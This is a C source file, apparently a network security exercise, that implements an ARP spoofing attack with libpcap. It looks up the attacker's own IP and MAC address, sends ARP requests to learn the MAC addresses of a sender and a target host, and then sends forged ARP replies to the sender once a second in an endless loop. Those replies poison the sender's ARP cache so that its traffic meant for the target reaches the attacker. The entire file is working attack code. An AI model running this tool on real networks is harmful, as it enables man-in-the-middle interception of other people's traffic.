#include <unistd.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>

void printMAC(unsigned char* mac){
	for(int i=0;i<5;i++)printf("%02x:",mac[i]);
	printf("%02x\n",mac[5]);
}

void construct_eth(struct ether_header *eth,unsigned char* dst_mac,unsigned char* src_mac){
	memcpy(eth->ether_dhost,dst_mac,6);
	memcpy(eth->ether_shost,src_mac,6);
	eth->ether_type=ntohs(ETHERTYPE_ARP);
}

void construct_arp(struct ether_arp *arp,unsigned char* dst_mac,unsigned char* src_mac,unsigned char *dst_ip,unsigned char* src_ip,int opcode){
	arp->arp_hrd=htons(ARPHRD_ETHER);
	arp->arp_pro=htons(ETHERTYPE_IP);
	arp->arp_hln=ETHER_ADDR_LEN;
	arp->arp_pln=sizeof(in_addr_t);
	if(opcode)arp->arp_op=htons(ARPOP_REQUEST);
	else arp->arp_op=htons(ARPOP_REPLY);
	if(dst_mac!=NULL)memcpy(arp->arp_tha,dst_mac,6);
	else memset(arp->arp_tha,'\x00',6);
	memcpy(arp->arp_sha,src_mac,6);
	inet_aton(dst_ip,arp->arp_tpa);
	inet_aton(src_ip,arp->arp_spa);
}

unsigned char* combine(struct ether_header *eth,struct ether_arp *arp){
	unsigned char *frame=(unsigned char*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
	memset(frame,0x00,sizeof(struct ether_header)+sizeof(struct ether_arp));
	memcpy(frame,eth,sizeof(struct ether_header));
	memcpy(frame+sizeof(struct ether_header),arp,sizeof(struct ether_arp));
	return frame;
}

unsigned char* send_packet(unsigned char* data,const char* ip,unsigned char* interface, struct pcap_pkthdr *header,int opcode){
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	const unsigned char* packet;
	int res;

	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
	if(handle==NULL){
		fprintf(stderr,"couldn't open device %s:%s\n",interface,errbuf);
		exit(1);
	}

	if(opcode==1){
		if(pcap_sendpacket(handle,data,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
			pcap_perror(handle,0);
			pcap_close(handle);
			exit(1);
		}
		while(1){
			res=pcap_next_ex(handle,&header,&packet);
			struct ether_header *etherneth;
			etherneth=(struct ether_header*)packet;
	
			if(ntohs(etherneth->ether_type)==ETHERTYPE_ARP){
				struct ether_arp *arph;
				arph=(struct ether_arp*)(packet+sizeof(struct ether_header));
				unsigned char buf[100];
				
				sprintf(buf,"%d.%d.%d.%d",arph->arp_spa[0],arph->arp_spa[1],arph->arp_spa[2],arph->arp_spa[3]);
				if(!strcmp(buf,ip)){
					printf("same with %s\n",ip);
					unsigned char* mac=(unsigned char*)malloc(6);
					memcpy(mac,&packet[6],6);
					return mac;
				}
				printf("unsame with %s\n",ip);
			}
			if(res==0)continue;
			if(res==-1||res==-2)break;
		}
		pcap_close(handle);
		}
	else if(opcode==0){
		while(1){
			if(pcap_sendpacket(handle,data,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
				pcap_perror(handle,0);
				pcap_close(handle);
				exit(1);
			}
			sleep(1);
		}
		return NULL;
	}
}

int main(int argc, const char* argv[]){
	const char* interface=argv[1];
	const char* sender_ip=argv[2];
	const char* target_ip=argv[3];
	struct ifreq ifr;
	struct sockaddr_in *attacker_ip;
	unsigned char *attacker_mac;
	unsigned char *sender_mac;
	unsigned char *target_mac;
	unsigned char *frame_sender,*fake_frame;
	//construct ethernet header, broadcast to know sender mac
	struct ether_header eth,fake_eth;
	//construct arp header
	struct ether_arp arp_req,fake_arp;
	struct in_addr sender_ip_addr={0};
	if(!inet_aton(sender_ip,&sender_ip_addr)){perror("non valid ip");exit(1);}

	memset(&ifr,0x00,sizeof(ifr));
	// ifr.ifr_addr.sa_family=AF_INET;
	strcpy(ifr.ifr_name,interface);
	
	int fd=socket(AF_INET,SOCK_DGRAM,0);
	if(fd==-1){perror("socket");exit(1);}
	
	//attacker 자신의 ip가져오기 
	if(ioctl(fd,SIOCGIFADDR,&ifr)==-1){perror("ioctl");exit(1);}
	attacker_ip=(struct sockaddr_in*)&ifr.ifr_addr;
	unsigned char att[100];
	sprintf(att,"%s",inet_ntoa(attacker_ip->sin_addr));
	printf("attacker ip : %s\n",att);	
	//attacker 자신의 mac주소 가져오기
	if(ioctl(fd,SIOCGIFHWADDR,&ifr)==-1){perror("ioctl");exit(1);}
	attacker_mac=(unsigned char*)ifr.ifr_hwaddr.sa_data;
	printf("attacker mac : ");
	printMAC(attacker_mac);

	//get sender mac
	memset(&eth,0x00,sizeof(struct ether_header));
	memset(&arp_req,0x00,sizeof(struct ether_arp));
	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",attacker_mac);
	construct_arp(&arp_req,NULL,attacker_mac,sender_ip,att,1);
	//combine eth and arp_req
	frame_sender=combine(&eth,&arp_req);
	
	struct pcap_pkthdr *header;
	sender_mac=send_packet(frame_sender,sender_ip,interface,header,1);
	printf("sender mac : ");
	printMAC(sender_mac);

	//get target mac
	memset(&eth,0x00,sizeof(struct ether_header));
	memset(&arp_req,0x00,sizeof(struct ether_arp));
	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",attacker_mac);
	construct_arp(&arp_req,NULL,attacker_mac,target_ip,att,1);
	frame_sender=combine(&eth,&arp_req);
	target_mac=send_packet(frame_sender,target_ip,interface,header,1);
	printf("target mac : ");
	printMAC(target_mac);

	//fake arp reply start
	printf("fake arp reply\n");
	memset(&fake_eth,0x00,sizeof(struct ether_header));
	memset(&fake_arp,0x00,sizeof(struct ether_arp));
	construct_eth(&fake_eth,sender_mac,attacker_mac);
	construct_arp(&fake_arp,sender_mac,attacker_mac,sender_ip,target_ip,0);
	fake_frame=combine(&fake_eth,&fake_arp);
	unsigned char* empty;
	empty=send_packet(fake_frame,NULL,interface,header,0);
	
	close(fd);
	return 0;
}
